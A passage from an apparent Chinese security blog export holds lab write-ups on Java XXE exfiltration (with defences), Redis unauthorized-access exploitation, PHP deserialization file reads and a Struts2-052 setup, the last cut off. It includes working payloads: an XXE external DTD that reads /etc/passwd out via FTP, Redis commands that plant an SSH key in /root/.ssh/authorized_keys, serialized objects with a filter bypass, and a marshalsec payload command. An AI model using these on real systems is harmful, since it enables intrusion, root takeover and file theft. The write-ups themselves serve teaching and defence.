class="line">[WEB] Starting webserver on 0.0.0.0:8888...</span><br><span class="line">[FTP] Starting FTP server on 0.0.0.0:2121...</span><br></pre></td></tr></table></figure><p>发送payload，这次我们查看<code>/etc/passwd</code>：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">data</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///etc/passwd"</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY % <span class="meta-keyword">dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://127.0.0.1:8888/evil.dtd"</span>&gt;</span></span></span><br><span class="line"><span class="meta">  %dtd;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">data</span>&gt;</span><span class="symbol">&amp;send;</span><span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ftp服务器得到回显，从结果可以看到，有些符号还是中断了ftp的传输：</p><p><img src="/xxe-XXE漏洞原理、攻击方式以及防御方法/1548225798806.png" alt="1548225798806"></p><h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><p>java的很多包都有xxe解析的漏洞，但是防御手段都大同小异，禁用外部实体就完事了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, <span class="string">""</span>);</span><br><span class="line">dbf.setAttribute(XMLConstants.ACCESS_EXTERNAL_SCHEMA, <span class="string">""</span>);</span><br></pre></td></tr></table></figure><p>其他包的禁用方法可以参考<a href="https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.md" target="_blank" rel="noopener">OWASP(XXE)_Prevention_Cheat_Sheet</a></p><p>可以看到，禁用实体之后已经不存在XXE：</p><p><img src="/xxe-XXE漏洞原理、攻击方式以及防御方法/1548226937710.png" alt="1548226937710"></p><h1 id="使用Unmarshaller和JAXBContext防御XXE漏洞"><a href="#使用Unmarshaller和JAXBContext防御XXE漏洞" class="headerlink" title="使用Unmarshaller和JAXBContext防御XXE漏洞"></a>使用Unmarshaller和JAXBContext防御XXE漏洞</h1><p>使用Unmarshaller和JAXBContext防御XXE漏洞是我感觉最优雅的解决办法了，Unmarshaller本身就屏蔽了外部实体，自然也没有XXE漏洞，不仅如此，它还能通过注解与类直接绑定，连解析都省了。</p><h2 id="定义DTO"><a href="#定义DTO" class="headerlink" title="定义DTO"></a>定义DTO</h2><p>新建UserDto.java文件，内容如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@XmlAccessorType</span>(XmlAccessType.FIELD)</span><br><span class="line"><span class="meta">@XmlRootElement</span>(name=<span class="string">"user"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserDto</span> </span>&#123;</span><br><span class="line">    <span class="meta">@XmlElement</span></span><br><span class="line"><span class="keyword">private</span> String username;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@XmlElement</span></span><br><span class="line"><span class="keyword">private</span> String password;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getUsername</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getPassword</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">"User(username="</span> + username + <span class="string">", password="</span> + password + <span class="string">")"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="定义XML反序列化工具类"><a href="#定义XML反序列化工具类" class="headerlink" title="定义XML反序列化工具类"></a>定义XML反序列化工具类</h2><p>新建Util.java：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Util</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">xmlStr2obj</span><span class="params">(Class clazz, String xmlStr)</span> </span>&#123;</span><br><span class="line">        Object xmlObject = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            JAXBContext context = JAXBContext.newInstance(clazz);</span><br><span class="line">            <span class="comment">// 进行将Xml转成对象的核心接口</span></span><br><span class="line">            Unmarshaller unmarshaller = context.createUnmarshaller();</span><br><span class="line">            StringReader sr = <span class="keyword">new</span> StringReader(xmlStr);</span><br><span class="line">            xmlObject = unmarshaller.unmarshal(sr);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (JAXBException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> xmlObject;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到我们这里使用了JAXBContext读取XML。</p><h2 id="定义Controller-1"><a href="#定义Controller-1" class="headerlink" title="定义Controller"></a>定义Controller</h2><p>新建XXEController.java：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">XXEController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@PostMapping</span>(value = <span class="string">"/xxe2"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">xxe2</span><span class="params">(@RequestBody String userString)</span></span>&#123;</span><br><span class="line">        UserDto userDto=(UserDto) Util.xmlStr2obj(UserDto<span class="class">.<span class="keyword">class</span>, <span class="title">userString</span>)</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Username: "</span> + userDto.getUsername()+<span class="string">", Password: "</span> + userDto.getPassword();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很有意思的是，笔者在写这文章的一开始就使用了Unmarshaller和JAXBContext的方案，导致了XXE漏洞根本复现不出来&gt;_&lt;</p>]]></content>
      
      
      <categories>
          
          <category> Web安全-XXE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> xxe </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>redis未授权&amp;弱密码漏洞复现和防护</title>
      <link href="/%E7%BB%84%E4%BB%B6-redis%E6%9C%AA%E6%8E%88%E6%9D%83-%E5%BC%B1%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E9%98%B2%E6%8A%A4/"/>
      <url>/%E7%BB%84%E4%BB%B6-redis%E6%9C%AA%E6%8E%88%E6%9D%83-%E5%BC%B1%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E9%98%B2%E6%8A%A4/</url>
      
        <content type="html"><![CDATA[<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="0x00-靶机配置"><a href="#0x00-靶机配置" class="headerlink" title="0x00 靶机配置"></a>0x00 靶机配置</h2><ol><li><p>IP：192.168.99.100</p></li><li><p>使用<code>apt install redis-server</code>安装redis服务</p></li><li><p><code>vi /etc/redis/redis.conf</code>，注释掉<code>bind 127.0.0.1 ::1</code>即让redis监听所有网段</p></li><li><p>新版的redis无密码时会触发保护模式，使用<code>CONFIG SET protected-mode no</code>解除保护模式</p></li><li><p>以root身份启动redis</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@anemone-VirtualBox:/etc<span class="comment"># ps -ef|grep redis-server</span></span><br><span class="line">redis     2847     1  0 21:05 ?        00:00:04 /usr/bin/redis-server *:6379</span><br><span class="line">root@anemone-VirtualBox:/etc<span class="comment"># kill -9 2847</span></span><br><span class="line">root@anemone-VirtualBox:/etc<span class="comment"># redis-server</span></span><br></pre></td></tr></table></figure></li></ol><a id="more"></a><h2 id="0x01检测是否存在漏洞"><a href="#0x01检测是否存在漏洞" class="headerlink" title="0x01检测是否存在漏洞"></a>0x01检测是否存在漏洞</h2><p>在攻击机上探测端口是否开放，redis默认端口为6379：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ nc -nv 192.168.99.100 6379</span><br><span class="line">(UNKNOWN) [192.168.99.100] 6379 (?) open</span><br></pre></td></tr></table></figure></p><p>使用<code>apt install redis</code>安装redis，接着尝试连接：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ redis-cli -h 192.168.99.100</span><br><span class="line">192.168.99.100:6379&gt; info</span><br><span class="line"><span class="comment"># Server</span></span><br><span class="line">redis_version:4.0.9</span><br><span class="line">redis_git_sha1:00000000</span><br><span class="line">redis_git_dirty:0</span><br><span class="line">redis_build_id:76095d16786fbcba</span><br><span class="line">redis_mode:standalone</span><br><span class="line">os:Linux 4.15.0-30-generic x86_64</span><br><span class="line">arch_bits:64</span><br></pre></td></tr></table></figure></p><h2 id="0x02-写ssh公钥实现远程登陆"><a href="#0x02-写ssh公钥实现远程登陆" class="headerlink" title="0x02 写ssh公钥实现远程登陆"></a>0x02 写ssh公钥实现远程登陆</h2><p>首先生产密钥对：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure><p>将公钥制作成上传文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">echo</span> -e <span class="string">"\n\n\n"</span>; cat ~/.ssh/id_rsa.pub; <span class="built_in">echo</span> -e <span class="string">"\n\n\n"</span>) &gt; upload.txt</span><br></pre></td></tr></table></figure><p>将上传文件保存在redis-cli的临时变量中：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat ~/upload.txt | redis-cli -h 192.168.99.100 -x <span class="built_in">set</span> tmp</span><br></pre></td></tr></table></figure><p>连接redis，将tmp变量的内容写入/root/.ssh/authorized_keys:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.99.100</span><br><span class="line">config <span class="built_in">set</span> dir /root/.ssh</span><br><span class="line">config <span class="built_in">set</span> dbfilename authorized_keys</span><br><span class="line">get tmp</span><br><span class="line">save</span><br></pre></td></tr></table></figure></p><p>接着使用私钥即可登陆靶机：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i ~/.ssh/id_rsa root@192.168.99.100</span><br></pre></td></tr></table></figure></p><p>可以发现登陆成功：</p><p><img src="/组件-redis未授权-弱密码漏洞复现和防护/1546674370840.png" alt="1546674370840"></p><h2 id="0x03-写crontab文件反弹shell"><a href="#0x03-写crontab文件反弹shell" class="headerlink" title="0x03 写crontab文件反弹shell"></a>0x03 写crontab文件反弹shell</h2><p>crontab跟ssh差不多，但是笔者再ubuntu18.04中复现失败，原因是写入的crontab文件存在redis的一些字符，导致格式不正确：</p><p><img src="/组件-redis未授权-弱密码漏洞复现和防护/1546674683585-1548679548966.png" alt="1546674683585"></p><h1 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h1><ol><li><p>使用<code>apt install redis-server</code>的方式安装，并且使用<code>service redis start</code>启动redis，这样redis会在一个低权限用户下运行：</p><p> <img src="/组件-redis未授权-弱密码漏洞复现和防护/1546674830672-1548679562502.png" alt="1546674830672"></p></li><li><p>若必须以root身份运行，为redis设置一定强度的密码（实际复现中我们可以发现，新版redis在以root运行，不设置密码的情况下会启动保护模式，只允许本地cli）</p></li><li><p>定时检查redis日志：</p><p><img src="/组件-redis未授权-弱密码漏洞复现和防护/1546674924759-1548679583781.png" alt="1546674924759"></p></li></ol><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ol><li><a href="https://www.freebuf.com/column/158065.html" target="_blank" rel="noopener">Redis未授权访问详解</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Web安全-组件 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP反序列化基本原理</title>
      <link href="/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/"/>
      <url>/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p>看完Java的反序列化之后，再看PHP的就很容易，毕竟PHP的反序列化的结果是文本格式。</p><h1 id="序列化-反序列化Demo"><a href="#序列化-反序列化Demo" class="headerlink" title="序列化/反序列化Demo"></a>序列化/反序列化Demo</h1><p>php的序列化/反序列化的函数主要是serialize和unserialize，参考“<a href="https://www.freebuf.com/articles/web/167721.html" target="_blank" rel="noopener">最通俗易懂的PHP反序列化原理分析</a>”一文，示例代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">"Anemone"</span>;</span><br><span class="line">    <span class="keyword">public</span> $sex = <span class="string">"man"</span>;</span><br><span class="line">    <span class="keyword">public</span> $age = <span class="number">18</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;name.<span class="string">" "</span>.<span class="keyword">$this</span>-&gt;sex.<span class="string">" "</span>.<span class="keyword">$this</span>-&gt;age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$person = <span class="keyword">new</span> Person();</span><br><span class="line">$person-&gt;age=<span class="number">19</span>;</span><br><span class="line"><span class="comment">// 序列化</span></span><br><span class="line">$serialized=serialize($person);</span><br><span class="line"><span class="keyword">echo</span> $serialized;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="comment">// 反序列化</span></span><br><span class="line">$new_person=unserialize($serialized);</span><br><span class="line"><span class="keyword">echo</span> print_r($new_person);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br></pre></td></tr></table></figure><a id="more"></a><p>运行结果：</p><p><img src="/反序列化-PHP反序列化基本原理/1546324598743.png" alt="1546324598743"></p><h2 id="序列化结构"><a href="#序列化结构" class="headerlink" title="序列化结构"></a>序列化结构</h2><p>仔细看一下PHP序列化结构，可以看到序列化是只保存对象值而不保存对象代码，所以在java篇时我们需要构造POP链来调用已存在的代码片段，这也是一开始反序列化问题没有被重视的原因。</p><p><img src="/反序列化-PHP反序列化基本原理/1546326095061.png" alt="1546326095061"></p><h1 id="例题1"><a href="#例题1" class="headerlink" title="例题1"></a>例题1</h1><p>unserialize1.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Shield</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $file;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename = <span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span> -&gt; file = $filename;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">readfile</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file) &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'..'</span>)===<span class="keyword">FALSE</span></span><br><span class="line">            &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'/'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'\\'</span>)==<span class="keyword">FALSE</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> @file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $x = <span class="keyword">new</span> Shield();</span><br><span class="line">    <span class="keyword">isset</span>($_GET[<span class="string">'class'</span>]) &amp;&amp; $g = $_GET[<span class="string">'class'</span>];</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>($g)) &#123;</span><br><span class="line">        $x = unserialize($g);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> $x-&gt;readfile();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>很明显的一个反序列化造成的文件包含漏洞，我们构造一个Shield对象，将其$file设为要读取的文件，再将其序列化即可，有如下payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Shield</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $file;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename = <span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span> -&gt; file = $filename;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">readfile</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file) &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'..'</span>)===<span class="keyword">FALSE</span></span><br><span class="line">            &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'/'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'\\'</span>)==<span class="keyword">FALSE</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> @file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $x = <span class="keyword">new</span> Shield();</span><br><span class="line">    $x-&gt;file=<span class="string">"unserialize1.php"</span>;</span><br><span class="line">    <span class="keyword">echo</span> serialize($x);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>得到<code>O:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:16:&quot;unserialize1.php&quot;;}</code>;</p><p>传入get参数得到文件：</p><p><img src="/反序列化-PHP反序列化基本原理/1546327261841.png" alt="1546327261841"></p><h1 id="例题2（-正则绕过-）"><a href="#例题2（-正则绕过-）" class="headerlink" title="例题2（+正则绕过 ）"></a>例题2（+正则绕过 ）</h1><p>unserialize2.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@error_reporting(<span class="number">1</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))</span><br><span class="line">        &#123;</span><br><span class="line">            $filename = <span class="string">"./&#123;$this-&gt;file&#125;"</span>;</span><br><span class="line">            <span class="keyword">if</span> (file_get_contents($filename))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> file_get_contents($filename);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'data'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $data = $_GET[<span class="string">'data'</span>];</span><br><span class="line">    preg_match(<span class="string">'/[oc]:\d+:/i'</span>,$data,$matches);</span><br><span class="line">    <span class="keyword">if</span>(count($matches))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Hacker!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        $good = unserialize($data);</span><br><span class="line">        <span class="keyword">echo</span> $good;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello world"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>注意到过滤规则<code>/[oc]:\d+:/i</code>，因为O是对象标记，避免不了，但是后面的数字可以做点文章，比如说<code>O:4:&quot;baby&quot;</code>==<code>O:%2B4:&quot;baby&quot;</code>(%2B是编码后的<code>+</code>号，这里参考了”<a href="https://www.smi1e.top/%E5%AE%89%E6%81%92%E6%9D%AF%E6%9C%88%E8%B5%9Bwrite-up/" target="_blank" rel="noopener">2018年安恒杯月赛Write Up-12月赛更新</a>“一文，作者在该位置使用fuzz来找到改符号的方法值得我们学习：<code>o:%&lt;FUZZ_POINT&gt;4:&quot;baby&quot;</code>)，按此思路先生成序列化对象：</p><p>得到<code>O:4:&quot;baby&quot;:1:{s:4:&quot;file&quot;;s:16:&quot;unserialize2.php&quot;;}</code>.</p><p>再传入<code>data=O:%2B4:&quot;baby&quot;:1:{s:4:&quot;file&quot;;s:16:&quot;unserialize2.php&quot;;}</code>得到文件包含：</p><p><img src="/反序列化-PHP反序列化基本原理/1546328179116.png" alt="1546328179116"></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><a href="https://www.freebuf.com/articles/web/167721.html" target="_blank" rel="noopener">最通俗易懂的PHP反序列化原理分析</a></li><li><a href="https://www.smi1e.top/%E5%AE%89%E6%81%92%E6%9D%AF%E6%9C%88%E8%B5%9Bwrite-up/" target="_blank" rel="noopener">2018年安恒杯月赛Write Up-12月赛更新</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Web安全-反序列化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Web安全 </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java反序列化3：Struts2-052反序列化漏洞分析</title>
      <link href="/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Struts2-052%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Struts2-052%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="部署脆弱服务"><a href="#部署脆弱服务" class="headerlink" title="部署脆弱服务"></a>部署脆弱服务</h2><p>下载<a href="https://archive.apache.org/dist/struts/2.5.12/struts-2.5.12-all.zip" target="_blank" rel="noopener">struts-2.5.12-all.zip</a>，将 struts-2.5.12/src/apps/ 目录下的 rest-showcase 导入 idea，再配置，如下：</p><p><img src="/反序列化-Struts2-052反序列化漏洞分析/1546071180604.png" alt="1546071180604"></p><p>运行后可以看到一个Struts2的一个Demo，大概提供一个订单服务，提供增删改查：</p><a id="more"></a><p><img src="/反序列化-Struts2-052反序列化漏洞分析/1546071610856.png" alt="1546071610856"></p><h2 id="生成攻击载荷"><a href="#生成攻击载荷" class="headerlink" title="生成攻击载荷"></a>生成攻击载荷</h2><p>使用<a href="https://github.com/mbechler/marshalsec" target="_blank" rel="noopener">marshalsec工具</a>，clone项目后使用<code>mvn clean package</code>编译得到<code>target\marshalsec-0.0.3-SNAPSHOT.jar</code>。</p><p>生成一个弹出计算器的payload：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.XStream ImageIO <span class="string">"calc"</span> &gt; poc.xml</span><br></pre></td></tr></table></figure><h2 id="弹出计算器"><a href="#弹出计算器" class="headerlink" 